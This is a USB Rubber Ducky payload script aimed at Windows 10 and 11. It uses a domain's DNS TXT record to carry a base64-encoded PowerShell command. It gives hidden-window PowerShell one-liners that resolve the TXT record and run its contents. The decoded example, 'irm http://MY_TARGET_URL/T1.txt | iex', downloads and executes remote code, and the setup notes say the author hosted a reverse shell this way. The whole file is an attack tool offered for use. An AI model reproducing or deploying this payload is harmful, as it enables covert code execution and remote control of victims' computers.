REM     Title: DNS-TXT-CommandInection
REM     Author: Nate
REM     Description: A usb rubber ducky payload that leverages DNS TXT records to perform command injection.
REM     Windows Powershell is the CLI used by the payload. Replace the DNS TXT record for your domain with
REM     the base64 encoded payload you have. See README.md for more details on converting your payload to base64
REM 	and an example of creating your DNS TXT record in AWS Route53 service.
REM     Target: Windows 10, 11
REM     Props: Hak5, Darren Kitchen, Korben
REM     Version: 1.0
REM     Category: Execution

REM     CONFIGURATION
REM     REQUIRED A domain with the ability to manipulate the DNS TXT records.
REM     REQUIRED Web Server hosting the payload. In this example, python3 http.server was used to host a 
REM     reverseshell.
REM     REQUIRED - Provide URL used for Example
DEFINE  #MY_TARGET_URL example.com
REM     Example: powershell /w 1 $a=(resolve-dnsname MY_TARGET_URL TXT).strings;powershell -e $a
REM     Example of Decoded payload: "irm http://MY_TARGET_URL/T1.txt | iex"

REM     NOTES: No base64 can be used as an alternative by replacing "$a=",";powershell -e $a" with just "|iex"
REM     for the STRING payload below. Examples of the decoded command and encoded command are shown below to put 
REM     into DNS TXT record.
REM     Decoded: "irm http://MY_TARGET_URL/T1.txt | iex"
REM     Encoded: "aQByAG0AIABoAHQAdABwADoALwAvAGUAeABhAG0AcABsAGUALgBjAG8AbQAvAFQAMQAuAHQAeAB0ACAAfAAgAGkAZQB4AA=="
